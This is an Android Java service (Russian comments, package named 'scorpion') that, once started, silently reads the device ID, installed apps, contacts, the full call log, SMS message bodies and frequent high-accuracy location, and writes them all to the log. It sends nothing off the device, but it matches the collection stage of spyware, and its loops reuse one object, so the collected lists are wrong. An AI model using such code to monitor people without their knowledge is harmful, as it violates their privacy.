package com.example.scorpion.myservice;

import android.Manifest;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MyService extends Service{

    private static final String LOG_TAG = "myLogs";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(LOG_TAG, "Сервис создан.");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(LOG_TAG, "Сервис запущен.");
        someTask();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopLocationUpdates();
        Log.d(LOG_TAG, "Сервис завершил работу.");
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    void someTask() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                getDeviceID();
                getDeviceName();
                installedApps();
                loadContacts();
                loadCallLog();
                loadSMS();
                requestLocations();
            }
        }).start();

    }

    //Получаем ID устройства.
    private void getDeviceID() {
        String deviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                Settings.Secure.ANDROID_ID);

        Log.d(LOG_TAG, "ANDROID_ID: " + deviceId);
    }

    //Узнаем модель и производителя устр-ва.
    private void getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            Log.d(LOG_TAG, "Device Name: " + capitalize(model));
        } else {
            Log.d(LOG_TAG, "Device Name: " + capitalize(manufacturer) + " " + model);
        }
    }

    //чтобы было читабельно
    private String capitalize(String s) {
        if (s == null || s.length() == 0)
            return "";

        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    //Установленные приложения.
    private void installedApps() {
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        ArrayList<String> apps = new ArrayList<>(); //Список установленных приложений.

        Log.d(LOG_TAG, "Installed Apps: ");
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                apps.add("App №" + Integer.toString(i) + " " + appName);
                Log.d(LOG_TAG, apps.get(apps.size() - 1));
            }
        }
    }

    //Загружаем контакты
    private void loadContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {

            Log.d(LOG_TAG, "READ_CONTACTS: Permission granted");
            ContentResolver contentResolver = getContentResolver();
            Cursor phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

            //Словарь для хранения контактов
            Map<String, String> contacts = new HashMap<String, String>();
            Log.d(LOG_TAG, "List of contacts: ");

            if (phones != null) {
                while (phones.moveToNext()) {
                    String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (!number.isEmpty()) {
                        contacts.put(name, number);

                        Log.d(LOG_TAG, "Name: " + name);
                        Log.d(LOG_TAG, "Number: " + number);
                    }
                }
                if (!phones.isClosed()) {
                    phones.close();
                }
            }
        } else {
            Log.d(LOG_TAG, "READ_CONTACTS: Permission denied");
        }

    }

    private void loadCallLog() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                == PackageManager.PERMISSION_GRANTED) {

            Log.d(LOG_TAG, "READ_CALL_LOG: Permission granted");
            Cursor getCall = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

            class Call {
                public String typeCall;
                public String number;
                public String name;
                public Date date;   //дата совершения вызова.
                public long duration; //длительность разговора в секундах
            }
            List<Call> calls = new ArrayList<>();

            Log.d(LOG_TAG, "List of calls:");
            if (getCall != null) {
                Call call = new Call();
                while (getCall.moveToNext()) {
                    call.name = getCall.getString(getCall.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    call.number = getCall.getString(getCall.getColumnIndex(CallLog.Calls.NUMBER));
                    call.date = new Date(getCall.getLong(getCall.getColumnIndex(CallLog.Calls.DATE)));
                    call.duration = Long.parseLong(getCall.getString(getCall.getColumnIndex(CallLog.Calls.DURATION)));

                    int tempTypeCall = Integer.parseInt(getCall.getString(getCall.getColumnIndex(CallLog.Calls.TYPE)));
                    switch (tempTypeCall) {
                        case CallLog.Calls.INCOMING_TYPE:
                            call.typeCall = "Incoming.";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            call.typeCall = "Outgoing.";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            call.typeCall = "Missed.";
                            break;
                        case CallLog.Calls.VOICEMAIL_TYPE:
                            call.typeCall = "VoiceMail.";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            call.typeCall = "Rejected.";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            call.typeCall = "Blocked automatically.";
                            break;
                        case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                            call.typeCall = "Answered on another device.";
                            break;
                        default:
                            break;
                    }

                    Log.d(LOG_TAG, "Name: " + call.name);
                    Log.d(LOG_TAG, "Number: " + call.number);
                    Log.d(LOG_TAG, "Date: " + call.date.toString());
                    Log.d(LOG_TAG, "Duration: " + call.duration / 3600 + "H " + (call.duration % 3600) / 60 + "M " + call.duration % 60 + "S.");
                    Log.d(LOG_TAG, "Type Call: " + call.typeCall);
                    Log.d(LOG_TAG, " ");
                    calls.add(call);
                }
                if (!getCall.isClosed())
                    getCall.close();
            }
        } else {
            Log.d(LOG_TAG, "READ_CALL_LOG: Permission denied.");
        }
    }

    private void loadSMS() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {

            Log.d(LOG_TAG, "READ_SMS: Permission granted.");
            Cursor getSMS = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);

            class SMS {
                String number;
                String body;
                Date dateReceive;
                Date dateSent;
                String typeSms;
            }
            List<SMS> listOfSMS = new ArrayList<>();

            Log.d(LOG_TAG, "SMS's: ");
            if (getSMS != null) {
                SMS sms = new SMS();
                while (getSMS.moveToNext()) {
                    sms.number = getSMS.getString(getSMS.getColumnIndex(Telephony.Sms.ADDRESS));
                    sms.body = getSMS.getString(getSMS.getColumnIndex(Telephony.Sms.BODY));
                    sms.dateReceive = new Date(getSMS.getLong(getSMS.getColumnIndex(Telephony.Sms.DATE)));
                    sms.dateSent = new Date(getSMS.getLong(getSMS.getColumnIndex(Telephony.Sms.DATE_SENT)));

                    switch (Integer.parseInt(getSMS.getString(getSMS.getColumnIndex(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            sms.typeSms = "Inbox.";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            sms.typeSms = "Sent.";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            sms.typeSms = "Outbox.";
                            break;
                        default:
                            break;
                    }

                    Log.d(LOG_TAG, "Number: " + sms.number);
                    Log.d(LOG_TAG, "Body: " + sms.body);
                    Log.d(LOG_TAG, "Type SMS: " + sms.typeSms);
                    Log.d(LOG_TAG, "Date of receiving: " + sms.dateReceive);
                    Log.d(LOG_TAG, "Date of sending: " + sms.dateSent);
                    Log.d(LOG_TAG, " ");
                    listOfSMS.add(sms);
                }
                if (!getSMS.isClosed())
                    getSMS.close();
            }
        } else {
            Log.d(LOG_TAG, "READ_SMS: Permission denied.");
        }
    }

    private LocationRequest mLocationRequest;
    private FusedLocationProviderClient fusedLocationClient;
    private static List<Location> locations;

    public static void setLocations(List<Location> locs){
        locations = locs;
    }

    private void requestLocations() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED) {
            Log.d(LOG_TAG, "ACCESS_FINE_LOCATION: Permission granted.");

            Log.d(LOG_TAG, "Locations:");

            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
            createLocationRequest();

            fusedLocationClient.requestLocationUpdates(mLocationRequest, getPendingIntent());

        } else {
            Log.d(LOG_TAG, "ACCESS_FINE_LOCATION: Permission denied.");
        }
    }

    //Желаемый интервал для обновления местоположения
    private static final long UPDATE_INTERVAL = 10 * 1000;
    //Пиковая скорость обновления местоположения
    private static final long FASTEST_UPDATE_INTERVAL = UPDATE_INTERVAL / 2;
    //Макс-ое время пакетного обновления местоположения
    private static final long MAX_WAIT_TIME = UPDATE_INTERVAL * 3;

    //Уст-ет запрос местоположения
    private void createLocationRequest() {
        mLocationRequest = new LocationRequest();

        mLocationRequest.setInterval(UPDATE_INTERVAL);
        //Устанавливает пиковую скорость для активных обновлений местоположения
        mLocationRequest.setFastestInterval(FASTEST_UPDATE_INTERVAL);
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        //Устанавливает максимальное время доставки пакетных обновлений местоположения
        mLocationRequest.setMaxWaitTime(MAX_WAIT_TIME);
    }

    private PendingIntent getPendingIntent() {
        Intent intent = new Intent(this, LocationUpdatesBroadcastReceiver.class);
        intent.setAction(LocationUpdatesBroadcastReceiver.ACTION_PROCESS_UPDATES);
        return PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
    }

    private void stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(getPendingIntent());
    }

}
